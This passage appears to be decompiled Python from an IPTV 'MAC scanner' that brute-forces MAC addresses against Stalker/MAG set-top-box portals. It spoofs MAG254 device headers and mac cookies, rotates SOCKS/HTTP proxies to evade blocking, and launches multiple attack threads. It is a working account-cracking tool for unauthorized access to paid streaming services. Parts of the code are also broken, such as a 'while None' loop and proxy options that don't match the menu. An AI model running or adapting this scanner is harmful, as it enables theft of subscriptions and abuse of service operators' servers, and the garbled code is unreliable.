                serim = input('\n   \33[1m\33[38;5;231m Use serial mac? \33[0m\n\t\t\t\t\t\n\33[36m\33[1m    1 - YES\n    2 - NO \33\n\n    \33[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\33[38;5;231m  ')
#                print('\33[H\33[J', '', **('end',))
                print(ckiptv)
                mactur = yeninesil[int(mactur) - 1]
                if serim == '':
                    serim = 2
                if serim == '1':
                    seri = input('\n\n\33[38;5;226m\33[1m   Sample \33[1;32m\33[1m= \33[36m\33[1m' + mactur + '\33[91m5\33[38;5;226m\33[1m\n\n   Sample \33[1;32m\33[1m= \33[36m\33[1m' + mactur + '\33[91mFA\33[0m\n\n\33[38;5;1m\33[1m   Write one or two values!\33[0m\n\n   \33[36m\33[1m' + mactur + '\33[91m')
#                    print('\33[H\33[J', '', **('end',))
                    print(ckiptv)
                combouz = input('\n\t\t\t\t\n   \33[1m\33[38;5;231m Enter number of mac to scan! \33[0m\n\n    \33[38;5;226mᴅᴇꜰᴀᴜʟᴛ Mᴀᴄꜱ = 999999\n\n\n    \33[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\33[38;5;231m ')
                if combouz == '':
                    combouz = 999999
                combouz = int(combouz)
                randommu = 'xdeep'
            else:
                print('Wrong file selection!')
                quit()

    if comboc == '':
        if randommu == '':
            combodosya = dosya.replace('/sdcard/combo/', '')
            combodosya = combodosya.replace('.txt', '')
            comboc = open(dosya, 'r')
            combototLen = comboc.readlines()
            combouz = len(combototLen)
        else:
            comboc = 'ckgroup'
    else:
        proxydosya = dosya
        proxyc = open(dosya, 'r')
        proxytotLen = proxyc.readlines()
        proxyuz = len(proxytotLen)
        statusproxy = '\n  |✮ 📂 ⇥\33[36m' + str(proxydosya) + '\33[0m \n  |✮ ℹ️ ⇥  \33[1;32m' + str(proxyuz) + '\33[0m   '

randommu = ''
dosyasec()
os.system('clear')

def clear():
    os.system('clear')

clear()
subprocess.run([
    'clear',
    ''])
print(ckiptv)
print('\n[Wanna use proxies]\n1 - Yes\n2 - No')
proxi = input('\n\33[1;91m[ \33[0m+\33[1;91m ]\33[0m\33[1;33mENTER YOUR CHOICE...\n\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mCK:\33[0m\33[1;90m  ')
#print('\33[H\33[J', '', **('end',))
print(ckiptv)
if proxi == '1':
    dosyasec()
    pro = input('   \33[1;91m[ \33[0m+\33[1;91m ]\33[0m\33[1;33mSELECT PROXY TYPE \n \n\n1 = ipVanish \n2 = Http/Https (IP:PORT) \n3 = Http/Https (User:Pass) \n4 = Socks4 (IP:PORT) \n5 = Socks4 (User:Pass) \n6 = Socks5 (IP:PORT) \n7 = Socks5 (User:Pass) \n\n    \n \33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mPROXY:\33[0m\33[1;90m   ')
subprocess.run([
    'clear',
    ''])
print(ckiptv)
print('\n [Select Data to show in the results]\n\n 0 = Nothing\n 1 = Channels only\n 2 = Show everything\n\33[1m \33[31m')
kanalkata = input('\33[1;91m[ \33[0m+\33[1;91m ]\33[0m\33[1;33mENTER YOUR CHOICE...\n\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mCK:\33[0m\33[1;90m ')
#print('\33[H\33[J', '', **('end',))
if kanalkata == '':
    kanalkata = '2'
subprocess.run([
    'clear',
    ''])
print(ckiptv)
botgir = input('\33[1;91m[ \33[0m+\33[1;91m ]\33[0m\33[1;33mSELECT THE NUMBER OF BOTS\n\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mBOTS:\33[0m\33[1;90m')
if botgir == '':
    botgir = 1
proxysay = 0
import re
pattern = '(\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2})'
k = 0
jj = 0
iii = 0
genmacs = ''
bib = 0
import random

def randommac():
    global combosay, genmacs, iii, jj, jj, k, iii
    combosay = combosay + 1
    if randomturu == '2':
        while None:
            genmac = str(mactur) + '%02x:%02x:%02x' % (random.randint(0, 256), random.randint(0, 256), random.randint(0, 256))
            if genmac not in genmacs:
                genmacs = genmacs + ' '
                break
    if iii >= 257:
        iii = 0
        jj = jj + 1
    if jj >= 257:
        if not len(seri) == 2:
            jj = 0
        k = k + 1
        if len(seri) == 2:
            quit()
    if k == 257:
        quit()
    genmac = str(mactur) + '%02x:%02x:%02x' % (k, jj, iii)
    iii = iii + 1
    if serim == '1':
        if len(seri) == 1:
            genmac = str(genmac).replace(str(genmac[:10]), str(mactur) + seri)
        if len(seri) == 2:
            genmac = str(genmac).replace(str(genmac[:11]), str(mactur) + seri)
    genmac = genmac.replace(':100', ':10')
    genmac = genmac.upper()
    return genmac

color = ''
vpnz2 = ''
import sys
pal = panel
if 'http://' in pal:
    pal = pal.split('://')[1]
    pal = pal.split('/')[0]

def hea1(panel, mac):
    macs = mac.upper()
    macs = urllib.parse.quote(mac)
    panell = panel
    if uzmanm == 'stalker_portal/server/load.php':
        panell = str(panel) + '/stalker_portal'
    data = {
        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
        'Referer': http + '://' + panell + '/c/',
        'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cookie': 'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis;',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'Keep-Alive',
        'X-User-Agent': 'Model: MAG254; Link: Ethernet' }
    if uzmanm == 'stalker_portal/server/load.php':
        data = {
            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
            'Referer': http + '://' + panell + '/c/',
            'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cookie': 'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis;',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'Keep-Alive',
            'X-User-Agent': 'Model: MAG254; Link: Ethernet' }
    if uzmanm == 'stalker_portal/server/load.php' and stalker_portal == '1':
        data = {
            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3',
            'Referer': http + '://' + panell + '/c/',
            'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cookie': 'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'Keep-Alive',
            'X-User-Agent': 'Model: MAG254; Link: Ethernet' }
    return data


def hea2(mac, token):
    macs = mac.upper()
    macs = urllib.parse.quote(mac)
    panell = panel
    if uzmanm == 'stalker_portal/server/load.php':
        panell = str(panel) + '/stalker_portal'
    data = {
        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
        'Referer': http + '://' + panell + '/c/',
        'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cookie': 'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis;',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'Keep-Alive',
        'X-User-Agent': 'Model: MAG254; Link: Ethernet',
        'Authorization': 'Bearer ' + str(token) }
    if uzmanm == 'stalker_portal/server/load.php':
        data = {
            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
            'Referer': http + '://' + panell + '/c/',
            'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cookie': 'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis;',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'Keep-Alive',
            'X-User-Agent': 'Model: MAG254; Link: Ethernet',
            'Authorization': 'Bearer ' + str(token) }
    if uzmanm == 'stalker_portal/server/load.php' and stalker_portal == '1':
        data = {
            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3',
            'Referer': http + '://' + panell + '/c/',
            'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cookie': 'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'Keep-Alive',
            'X-User-Agent': 'Model: MAG254; Link: Ethernet',
            'Authorization': 'Bearer ' + str(token) }
    return data


def month_string_to_number(ay):
    m = {
     'jan': '1', 
     'feb': '2', 
     'mar': '3', 
     'apr': '4', 
     'may': '5', 
     'jun': '6', 
     'jul': '7', 
     'aug': '8', 
     'sep': '9', 
     'oct': '10', 
     'nov': '11', 
     'dec': '12'}
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')


from datetime import date

def tarih_clear(trh):
    ay = ''
    gun = ''
    yil = ''
    trai = ''
    my_date = ''
    sontrh = ''
    out = ''
    ay = str(trh.split(' ')[0])
    gun = str(trh.split(', ')[0].split(' ')[1])
    yil = str(trh.split(', ')[1])
    ay = str(month_string_to_number(ay))
    trai = str(gun) + '/' + str(ay) + '/' + str(yil)
    my_date = str(trai)
    d = date(int(yil), int(ay), int(gun))
    sontrh = time.mktime(d.timetuple())
    out = int((sontrh - time.time()) / 86400)
    return out


import requests, os, pip, datetime, os, socket, hashlib, json, random, sys, time, re, marshal, subprocess
try:
    import threading
except:
    pass

import pathlib, base64
try:
    import requests
except:
    print('requests modul not found \n requests modul installing now... \n')
    pip.main(['install', 'requests'])

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import logging
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP'
ses = requests.Session()

combosay = 0
combosay = 0

def combogetir():
    global combosay
    combogeti = ''
    combosay = combosay + 1
    try:
        combogeti = combototLen[combosay]
    except:
        pass

    return combogeti


def proxygetir():
    global bib
    global proxysay
    if proxi == '1':
        bib = bib + 1
        bekle(bib, 'xdeep')
        if bib == 15:
            bib = 0
        while True:
            try:
                proxysay = proxysay + 1
                if proxysay == proxyuz:
                    proxysay = 0
                proxygeti = proxytotLen[proxysay]
                pveri = proxygeti.replace('\n', '')
                pip = pveri.split(':')[0]
                pport = pveri.split(':')[1]
                if pro == '1':
                    pname = pveri.split(':')[2]
                    ppass = pveri.split(':')[3]
                    proxies = {'http':'socks5://' + pname + ':' + ppass + '@' + pip + ':' + pport,  'https':'socks5://' + pname + ':' + ppass + '@' + pip + ':' + pport}
                if pro == '2':
                    proxies = {'http':'socks4://' + pip + ':' + pport, 
                     'https':'socks4://' + pip + ':' + pport}
                if pro == '3':
                    proxies = {'http':'socks5://' + pip + ':' + pport, 
                     'https':'socks5://' + pip + ':' + pport}
                if pro == '4':
                    proxies = {'http':'http://' + pip + ':' + pport, 
                     'https':'https://' + pip + ':' + pport}
                break
            except:
                pass

    else:
        proxies = ''
    return proxies


import threading
for xdeep in range(int(botgir)):
    XDeep = threading.Thread(target=XD)
    XDeep.start()